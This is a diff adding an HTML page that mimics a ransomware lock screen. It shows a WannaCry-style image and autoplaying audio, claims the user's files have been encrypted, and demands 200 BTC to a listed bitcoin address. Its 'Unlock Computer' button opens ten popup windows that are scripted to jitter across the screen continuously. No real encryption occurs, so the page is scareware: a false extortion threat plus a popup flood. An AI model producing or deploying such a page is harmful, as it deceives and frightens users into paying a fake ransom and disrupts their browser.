@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: red; /* Red background initially */
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center top; /* Center the background image horizontally and align it to the top vertically */
+            text-align: center;
+            color: black;
+        }
+        img {
+            width: 18%;
+            display: block;
+            margin: 50px auto 0; /* Move the image down by adding margin-top: 50px */
+        }
+    </style>
+</head>
+<body>
+    <audio autoplay loop>
+        <source src="https://www.marxists.org/history/ussr/sounds/mp3/soviet-anthem.mp3" type="audio/mp3">
+        Your browser does not support the audio element.
+    </audio>
+    <img src="https://www.bleepstatic.com/content/hl-images/2017/05/12/wana-292-176.png" alt="" />
+    <h1>Dear User, Your computer has been locked and your files have been encrypted in my 256byte server. If you would like your files, please send 200 BTC to this address</h1>
+    <p>1JHy8rLQQPB5QCp8Zy9xM1j9pnjs2KJUgx</p>
+    <button onclick="startPopups()">Unlock Computer</button>
+    <script>
+        var popupWindows = [];
+
+        function startPopups() {
+            // Change background image after clicking the button
+            document.body.style.backgroundImage = "url('https://steamuserimages-a.akamaihd.net/ugc/924796104660585998/4B18E8C62A1BF9BDBA7F1014D98EC7F86E4581E7/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false')";
+            document.body.style.backgroundPosition = "center top"; // Center the background image horizontally and align it to the top vertically
+            
+            // Start popups
+            for (let i = 0; i < 10; i++) {
+                openPopupWithImageAndMove();
+            }
+            setInterval(movePopups, 10); // Move the popups every 10 milliseconds
+        }
+
+        function openPopupWithImageAndMove() {
+            const popupWidth = 400;
+            const popupHeight = 400;
+            const screenWidth = window.innerWidth;
+            const screenHeight = window.innerHeight;
+            const left = Math.floor(Math.random() * (screenWidth - popupWidth));
+            const top = Math.floor(Math.random() * (screenHeight - popupHeight));
+            const popupWindow = window.open("", "", "width=" + popupWidth + ",height=" + popupHeight + ",left=" + left + ",top=" + top);
+            const popupContent = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Popup Window</title>
+                    <style>
+                        body { margin: 0; padding: 20px; background-color: #f0f0f0; }
+                        img { max-width: 100%; height: auto; display: block; margin: 0 auto; }
+                    </style>
+                </head>
+                <body>
+                    <img src="https://i.ytimg.com/vi/-EOm7D40ZqY/maxresdefault.jpg" alt="Popup Image">
+                </body>
+                </html>
+            `;
+            popupWindow.document.write(popupContent);
+            popupWindows.push(popupWindow);
+
+            // Add onbeforeunload event listener
+            popupWindow.onbeforeunload = function() {
+                console.log("Popup window is about to close.");
+            };
+        }
+
+        function movePopups() {
+            popupWindows.forEach(function(popupWindow) {
+                const moveX = Math.floor(Math.random() * 21) - 10; // Random movement in X direction (-10 to 10 pixels)
+                const moveY = Math.floor(Math.random() * 21) - 10; // Random movement in Y direction (-10 to 10 pixels)
+                const newX = popupWindow.screenX + moveX;
+                const newY = popupWindow.screenY + moveY;
+                popupWindow.moveTo(newX, newY);
+            });
+        }
+    </script>
+</body>
+</html>
